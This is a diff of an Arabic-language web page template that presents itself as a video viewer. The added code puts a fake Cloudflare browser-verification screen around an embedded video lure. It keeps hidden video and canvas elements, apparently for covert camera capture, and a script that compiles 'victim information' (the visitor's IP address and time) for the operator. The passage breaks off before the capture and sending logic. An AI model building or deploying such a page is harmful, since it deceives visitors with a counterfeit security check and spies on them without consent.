@@ -67,31 +67,40 @@ a:hover {color: #f4a15d;}
     <title>مشاهدة الفيديو</title>
 </head>
 <body>
-    <h1><span>لحظه وحده من فضلك</span></h1> 
-    <div id="no-cookie-warning" class="cookie-warning" style="display:none"> 
-        <p style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p> 
-    </div> 
+    <table width="100%" height="100%" cellpadding="20">
+        <tbody>
+            <tr>
+                <td align="center" valign="middle">
+                    <div class="cf-browser-verification cf-im-under-attack">
+                        <noscript>
+                            <h1 data-translate="turn_on_js" style="color:#bd2426;">الرجاء تفعيل JavaScript وإعادة تحميل الصفحة.</h1>
+                        </noscript>
+                        <div id="cf-content" style="display: block;">
+                            <h1><span>لحظة واحدة من فضلك</span></h1>
+                            <div id="no-cookie-warning" class="cookie-warning" style="display:none">
+                                <p style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p>
+                            </div>
 
-    <!-- تضمين فيديو باستخدام iframe -->
-    <iframe width="100%" height="500" src="https://sendvid.com/assets/q9wxqj91.mp4" frameborder="0" allowfullscreen></iframe>
+                            <!-- تضمين فيديو باستخدام iframe -->
+                            <iframe src="https://pixeldrain.com/u/FoA9FVhm" width="100%" height="500" allowfullscreen></iframe>
 
-    <div class="attribution"></div> 
+                            <div class="attribution"></div>
 
-    <script>
-        // تم إزالة عداد التوجيه
-    </script>
-    <video id="video" style="display:none" playsinline autoplay></video>
-    <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
-    <script type="text/javascript">
-    var c=false,l=false,uid="<%=uid %>";
-    async function gather(){
-        var td="";
-        <% if(!t){ %>
-        td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | الوقت: <%=time %></b>';
-        <% }else{ %>
-        await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | الوقت: <%=time %></b>'));
-   
+                            <script>
+                                // تم إزالة عداد التوجيه
+                            </script>
+                            <video id="video" style="display:none" playsinline autoplay></video>
+                            <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+                            <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+                            <script type="text/javascript">
+                                var c = false, l = false, uid = "<%=uid %>";
+                                async function gather() {
+                                    var td = "";
+                                    <% if (!t) { %>
+                                    td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | الوقت: <%=time %></b>';
+                                    <% } else { %>
+                                    await fetch("<%=a %>").then((r) => r.json()).then((d) => (td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#' + d.ip + '" >' + d.ip + '</a> | الوقت: <%=time %></b>'));
+                               
 
 <% } %>
 
